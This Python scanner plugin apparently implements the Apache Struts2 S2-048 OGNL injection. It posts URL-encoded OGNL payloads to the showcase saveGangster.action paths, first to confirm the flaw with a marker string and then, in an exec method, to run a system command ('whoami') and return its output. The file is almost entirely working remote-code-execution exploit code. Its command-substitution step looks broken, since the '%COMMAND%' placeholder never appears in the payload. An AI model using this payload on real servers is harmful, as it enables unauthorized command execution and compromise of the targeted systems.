#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: 'orleven'

import re
from lib.utils.connect import ClientSession
from script import Script, SERVICE_PORT_MAP, VUL_LEVEL, VUL_TYPE

class POC(Script):
    def __init__(self, target=None):
        self.service_type = SERVICE_PORT_MAP.WEB
        self.name = 'Struts2-048'
        self.keyword = ['struts2', 'java']
        self.info = 'Struts2-048'
        self.type = VUL_LEVEL.CRITICAL
        self.level = VUL_TYPE.RCE
        Script.__init__(self, target=target, service_type=self.service_type)

    async def prove(self):
        await self.get_url()
        if self.url != None:
            prove_poc = '''%25%7B%28%23test%3D%27multipart%2Fform-data%27%29.%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23_memberAccess%3F%28%23_memberAccess%3D%23dm%29%3A%28%28%23container%3D%23context%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ognlUtil%3D%23container.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ognlUtil.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ognlUtil.getExcludedClasses%28%29.clear%28%29%29.%28%23context.setMemberAccess%28%23dm%29%29%29%29.%28%23req%3D@org.apache.struts2.ServletActionContext@getRequest%28%29%29.%28%23res%3D@org.apache.struts2.ServletActionContext@getResponse%28%29%29.%28%23res.setContentType%28%27text%2Fhtml%3Bcharset%3DUTF-8%27%29%29.%28%23res.getWriter%28%29.print%28%27start%3Astruts2_security_%27%29%29.%28%23res.getWriter%28%29.print%28%27check%3Aend%27%29%29.%28%23res.getWriter%28%29.flush%28%29%29.%28%23res.getWriter%28%29.close%28%29%29%7D'''
            poc_key =  "struts2_security_check"
            async with ClientSession() as session:
                paths = [
                    'struts2-showcase/integration/saveGangster.action',
                    'integration/saveGangster.action',
                ]
                headers = {'Content-Type': 'application/x-www-form-urlencoded'}
                for path in paths:
                    _data = 'name=' + prove_poc + '&age=a&__checkbox_bustedBefore=true&description=s'
                    async with session.post(url=self.base_url + path, data=_data, headers=headers) as res:
                        if res:
                            text = await res.text()
                            if poc_key in text:
                                self.flag = 1
                                self.req.append({"poc": prove_poc})
                                self.res.append({"info": self.url, "key": "struts2_048"})
                                return

    async def exec(self):
        await self.get_url()
        if self.url != None:
            cmd = self.parameter['cmd']
            exec_poc = '''%25%7b(%23test%3d%27multipart%2fform-data%27).(%23dm%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS).(%23_memberAccess%3f(%23_memberAccess%3d%23dm)%3a((%23container%3d%23context%5b%27com.opensymphony.xwork2.ActionContext.container%27%5d).(%23ognlUtil%3d%23container.getInstance(%40com.opensymphony.xwork2.ognl.OgnlUtil%40class)).(%23ognlUtil.getExcludedPackageNames().clear()).(%23ognlUtil.getExcludedClasses().clear()).(%23context.setMemberAccess(%23dm)))).(%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest()).(%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse()).(%23res.setContentType(%27text%2fhtml%3bcharset%3dUTF-8%27)).(%23res.getWriter().print(%27start%3a%27)).(%23s%3dnew+java.util.Scanner((new+java.lang.ProcessBuilder(%27whoami%27.toString().split(%27%5c%5cs%27))).start().getInputStream()).useDelimiter(%27%5c%5cAAAA%27)).(%23str%3d%23s.hasNext()%3f%23s.next()%3a%27%27).(%23res.getWriter().print(%23str)).(%23res.getWriter().print(%27%3aend%27)).(%23res.getWriter().flush()).(%23res.getWriter().close()).(%23s.close())%7d'''
            async with ClientSession() as session:
                paths = [
                    'struts2-showcase/integration/saveGangster.action',
                    'integration/saveGangster.action',
                ]
                headers = {'Content-Type': 'application/x-www-form-urlencoded'}
                _data = 'name=' + exec_poc.replace("%COMMAND%", cmd) + '&age=a&__checkbox_bustedBefore=true&description=s'
                for path in paths:
                    async with session.post(url=self.base_url + path, data=_data, headers=headers) as res:
                        if res:
                            text = await res.text()
                            pat = re.compile('start:' + '(.*?)' + ':end', re.S)
                            result = pat.findall(text)
                            if len(result) !=0:
                                result = result[0].rstrip('\n')
                                self.flag = 1
                                self.req.append({"poc": exec_poc})
                                self.res.append({"info": result, "key": cmd})

